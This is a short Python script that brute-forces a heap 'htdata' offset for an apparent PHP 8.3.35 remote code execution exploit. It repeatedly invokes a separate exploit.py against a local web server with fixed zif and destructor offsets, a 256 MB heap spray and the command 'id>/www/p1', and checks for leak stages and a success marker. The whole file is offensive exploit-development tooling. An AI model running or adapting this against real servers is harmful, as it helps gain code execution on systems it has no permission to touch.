"""Scan different htdata offsets for 8.3.35 to find the right one.
The issue is that the carrier lands at the wrong offset. Let me try
different htdata values to see if any of them work.
"""
import sys, os, subprocess, time

BASE = os.path.dirname(os.path.abspath(__file__))
EXPLOIT = os.path.join(BASE, "exploit.py")

def try_htdata(offset):
    """Try a specific htdata offset."""
    hex_off = hex(offset)
    cmd = [
        sys.executable, EXPLOIT,
        "-u", "http://127.0.0.1:18112/",
        "-c", "id>/www/p1",
        "--zif-offset", "0x3ac080",
        "--dtor-offset", "0x49ec50",
        "--htdata-offset", hex_off,
        "--profile", "bookworm",
        "--huge-mb", "256",
        "--retries", "1",
        "--fetch", "/p1",
        "--no-auto-offsets",
        "-q",
    ]
    t0 = time.time()
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        out = (r.stdout or "") + (r.stderr or "")
        ok = "PROOF:" in out and r.returncode == 0
        dt = time.time() - t0
        status = "SUCCESS" if ok else "FAIL"
        stage = "unknown"
        if "HEAP_LEAK_FAILED" in out:
            stage = "stage-1"
        elif "LIBPHP_LEAK_FAILED" in out:
            stage = "stage-2"
        elif "EXPLOIT_FAILED" in out:
            stage = "stage-3"
        print(f"  htdata=0x{offset:05x} ({hex_off}): {status} ({stage}, {dt:.1f}s)", flush=True)
        return ok
    except Exception as e:
        print(f"  htdata=0x{offset:05x}: ERROR: {e}", flush=True)
        return False

print("=== Scanning htdata offsets for 8.3.35 ===", flush=True)
print("(Base offset: 0x690d8, scanning ±0x200)", flush=True)

base = 0x690d8
# Scan ±0x200 around the base
for delta in range(-0x200, 0x201, 0x10):
    offset = base + delta
    if offset < 0x10000:
        continue
    ok = try_htdata(offset)
    if ok:
        print(f"\n[+] FOUND! htdata=0x{offset:05x}", flush=True)
        break
    time.sleep(0.5)

print("\n=== done ===", flush=True)
